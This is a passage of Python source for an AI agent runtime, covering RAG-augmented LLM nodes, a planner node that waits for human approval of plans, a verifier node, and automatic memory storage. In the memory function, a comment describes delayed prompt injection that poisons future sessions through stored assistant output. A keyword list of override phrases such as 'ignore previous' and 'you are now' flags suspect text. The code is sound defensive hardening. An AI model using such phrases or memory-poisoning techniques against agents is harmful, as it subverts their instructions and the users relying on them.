                    f"Use the following context to answer the user's question.{context_block}"
                )

            augmented_node = NodeConfig(
                type="llm",
                label=node.label,
                model=node.model or model,
                system_prompt=node_prompt,
                temperature=node.temperature,
                max_tokens=node.max_tokens,
                tool_params=node.tool_params,
            )

            async for event in self._execute_llm_node(
                ctx,
                augmented_node,
                graph,
                augmented_node.model or model,
                tools_schema,
                "",
            ):
                yield event

            yield AgentEvent(
                type=AgentEventType.THINK,
                content=f"RAG retrieved {len(rag_result.documents)} docs, {len(rag_result.context_text)} chars context",
                node_id=node.label,
                metadata={
                    "rag_docs": len(rag_result.documents),
                    "rag_context_chars": len(rag_result.context_text),
                    "rag_mode": rag_config.mode,
                },
            )
        else:
            yield AgentEvent(
                type=AgentEventType.THINK,
                content="RAG: no relevant context found, proceeding without retrieval",
                node_id=node.label,
                metadata={"rag_docs": 0},
            )
            async for event in self._execute_llm_node(
                ctx, node, graph, model, tools_schema, system_prompt
            ):
                yield event

    async def _execute_planner_node(
        self,
        ctx: AgentContext,
        node: NodeConfig,
        graph: AgentGraph,
    ) -> AsyncIterator[AgentEvent]:
        """Execute a planner node — generate execution plan for user approval."""
        try:
            from .planner import PlannerEngine
        except ImportError:
            yield AgentEvent(type=AgentEventType.ERROR, content="Planner engine not available")
            return

        task = ""
        for msg in reversed(ctx.messages):
            if isinstance(msg, dict) and msg.get("role") == "user":
                task = msg.get("content", "")
                break
        if not task:
            task = node.tool_params.get("task", "unknown task")

        planner = PlannerEngine(gateway=self.llm_gateway)
        context_text = node.tool_params.get("context", "")
        target_files = node.tool_params.get("target_files")

        plan = await planner.create_plan(task, context=context_text, files=target_files)

        yield AgentEvent(
            type=AgentEventType.THINK,
            content=f"Plan generated: {plan.task} ({len(plan.steps)} steps, risk={plan.overall_risk})",
            node_id=node.label,
            metadata={
                "plan_id": plan.id,
                "steps": len(plan.steps),
                "risk": plan.overall_risk,
                "status": plan.status,
            },
        )

        ctx.variables.set("current_plan_id", plan.id)
        ctx.variables.set("plan_step_count", len(plan.steps))
        ctx.variables.set("plan_risk", plan.overall_risk)

        step_summaries = []
        for step in plan.steps:
            step_summaries.append(
                {
                    "id": step.id,
                    "description": step.description,
                    "action": step.action,
                    "target_files": step.target_files,
                    "complexity": step.estimated_complexity,
                }
            )

        yield AgentEvent(
            type=AgentEventType.TOOL_RESULT,
            content=f"Execution plan: {plan.task}\nSteps: {len(plan.steps)}\nRisk: {plan.overall_risk}",
            name="planner",
            node_id=node.label,
            metadata={
                "plan_id": plan.id,
                "steps": step_summaries,
                "requires_approval": plan.overall_risk != "low",
            },
        )

        # C6 plan-as-mode: block in-graph for approval when await_approval set.
        # The future is resolved by approve_plan_in_graph/reject_plan_in_graph,
        # called from the planner.approve_plan/reject_plan RPC handlers.
        await_approval = node.tool_params.get("await_approval", False)
        if await_approval:
            timeout = float(node.tool_params.get("approval_timeout", 300.0))
            loop = asyncio.get_running_loop()
            future: asyncio.Future[bool] = loop.create_future()
            self._plan_futures[plan.id] = future
            # 审计 A-1 Tier1: 登记归属 exec, 异常路径 reap 兜底.
            self._register_exec_future(ctx.session_id, plan.id)
            logger.info(
                "planner node %s blocking for approval plan_id=%s timeout=%.0fs",
                node.label,
                plan.id,
                timeout,
            )
            yield AgentEvent(
                type=AgentEventType.PLAN_APPROVAL,
                content=f"Plan {plan.id} awaiting approval",
                name="planner",
                node_id=node.label,
                metadata={
                    "plan_id": plan.id,
                    "action": "pending_approval",
                    "steps": step_summaries,
                },
            )
            try:
                approved = await asyncio.wait_for(future, timeout=timeout)
            except asyncio.TimeoutError:
                self._plan_futures.pop(plan.id, None)
                logger.warning("planner approval timed out plan_id=%s", plan.id)
                yield AgentEvent(
                    type=AgentEventType.PLAN_APPROVAL,
                    content=f"Approval timed out for plan {plan.id}",
                    name="planner",
                    node_id=node.label,
                    metadata={"plan_id": plan.id, "action": "timeout"},
                )
                ctx.error = f"Planner: approval timed out for plan {plan.id}"
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return

            self._plan_futures.pop(plan.id, None)
            if approved:
                logger.info("planner plan %s approved, proceeding", plan.id)
                yield AgentEvent(
                    type=AgentEventType.PLAN_APPROVAL,
                    content=f"Plan {plan.id} approved",
                    name="planner",
                    node_id=node.label,
                    metadata={"plan_id": plan.id, "action": "approved"},
                )
            else:
                logger.info("planner plan %s rejected, stopping", plan.id)
                yield AgentEvent(
                    type=AgentEventType.PLAN_APPROVAL,
                    content=f"Plan {plan.id} rejected",
                    name="planner",
                    node_id=node.label,
                    metadata={"plan_id": plan.id, "action": "rejected"},
                )
                ctx.error = f"Planner: plan {plan.id} rejected"
                yield AgentEvent(type=AgentEventType.ERROR, content=ctx.error)
                return

    async def _execute_verify_node(
        self,
        ctx: AgentContext,
        node: NodeConfig,
        graph: AgentGraph,
    ) -> AsyncIterator[AgentEvent]:
        try:
            from .verifier import VerificationEngine
        except ImportError:
            yield AgentEvent(type=AgentEventType.ERROR, content="Verification engine not available")
            return

        task = node.tool_params.get("task", "")
        if not task:
            for msg in reversed(ctx.messages):
                if isinstance(msg, dict) and msg.get("role") == "user":
                    task = msg.get("content", "")
                    break

        output = node.tool_params.get("output", "")
        if not output:
            for msg in reversed(ctx.messages):
                if isinstance(msg, dict) and msg.get("role") == "assistant":
                    output = msg.get("content", "")
                    break

        criteria = node.tool_params.get("criteria", "")
        context_text = node.tool_params.get("context", "")
        max_attempts = node.tool_params.get("max_attempts", 3)

        engine = VerificationEngine(gateway=self.llm_gateway, max_attempts=max_attempts)
        result = await engine.verify(
            task=task,
            output=output,
            criteria=criteria,
            context=context_text,
            max_attempts=max_attempts,
        )

        ctx.variables.set("verify_passed", result.passed)
        ctx.variables.set("verify_score", result.score)
        ctx.variables.set("verify_attempt", result.attempt)

        yield AgentEvent(
            type=AgentEventType.VERIFY,
            content=f"Verification {'passed' if result.passed else 'failed'} (score={result.score:.2f}, attempt={result.attempt}/{result.max_attempts})",
            name="verifier",
            node_id=node.label,
            metadata=result.to_dict(),
        )

        if not result.passed and result.issues:
            yield AgentEvent(
                type=AgentEventType.THINK,
                content=f"Verification issues: {'; '.join(result.issues)}",
                node_id=node.label,
                metadata={"suggestion": result.suggestion},
            )

    async def _auto_store_memory(self, ctx: AgentContext, graph: AgentGraph) -> None:
        if not self.memory_engine:
            return
        user_msgs = [m.get("content", "") for m in ctx.messages if m.get("role") == "user"]
        assistant_msgs = [
            m.get("content", "") for m in ctx.messages if m.get("role") == "assistant"
        ]
        if not user_msgs and not assistant_msgs:
            return
        last_user = user_msgs[-1] if user_msgs else ""
        last_assistant = assistant_msgs[-1] if assistant_msgs else ""
        scope = f"graph:{graph.name}"
        content = f"Q: {last_user[:200]} A: {last_assistant[:500]}"
        # 审计 A-2: LLM assistant 输出是不可信源, 不可归 "user" 类型 (该类型
        # 保留给真人输入, 高优先级 recall). _auto_store_memory 含 assistant 文本,
        # 若 classify 命中 "i am/i prefer" 归 user = 延迟注入毒化未来会话. 强制
        # 降级: 命中 user 则改 project, 标 source="llm" 低信任, 记注入嫌疑模式.
        from .memory_engine import classify_memory_type

        mem_type = classify_memory_type(content)
        llm_sourced = bool(last_assistant)
        if llm_sourced and mem_type == "user":
            mem_type = "project"
            logger.info(
                "auto-store: LLM-sourced content reclassified user->project "
                "(user type reserved for human input, A-2 injection hardening)"
            )
        # 简易注入嫌疑检测: assistant 文本含指令性 "ignore previous"/"system:" 等
        llm_injection_suspect = llm_sourced and any(
            pat in last_assistant.lower()
            for pat in ("ignore previous", "ignore all", "system:", "disregard", "you are now")
        )
        await asyncio.to_thread(
            self.memory_engine.store,
            content=content,
            scope=scope,
            tags="auto-store",
            importance=7 if not ctx.error else 3,
            metadata={
                "graph_id": graph.id,
                "error": ctx.error,
                "iterations": ctx.iteration_count,
                "source": "llm" if llm_sourced else "user",
                "injection_suspect": llm_injection_suspect,
            },
            memory_type=mem_type,
        )
        logger.info(
            "Auto-stored execution result to memory (scope=%s type=%s source=%s)",
            scope, mem_type, "llm" if llm_sourced else "user",
        )

    def set_knowledge_engine(self, engine: Any) -> None:
        if hasattr(engine, "embedding_fn") and engine.embedding_fn is None and self.llm_gateway:
            import asyncio
            import concurrent.futures

            def _sync_embed(text: str) -> list[float]:
                try:
                    asyncio.get_running_loop()
                    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
                        return pool.submit(asyncio.run, self.llm_gateway.aembed(text)).result()
                except RuntimeError:
                    return asyncio.run(self.llm_gateway.aembed(text))

            try:
                test_emb = _sync_embed("test")
                if test_emb and len(test_emb) > 0:
                    engine.embedding_fn = _sync_embed
                    logger.info("Wired real embedding_fn to KnowledgeEngine")
            except Exception as e:
                logger.warning("Could not wire embedding_fn: %s", e)

        self._knowledge_engine = engine
        logger.info("Knowledge engine set on runtime")
